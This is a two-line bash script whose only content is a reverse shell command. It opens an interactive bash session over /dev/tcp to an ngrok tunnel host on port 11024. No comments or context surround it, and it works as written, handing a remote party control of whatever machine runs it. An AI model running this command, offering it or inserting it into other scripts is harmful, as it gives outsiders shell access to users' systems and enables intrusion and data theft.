#!/bin/bash
bash -i >& /dev/tcp/0.tcp.in.ngrok.io/11024 0>&1
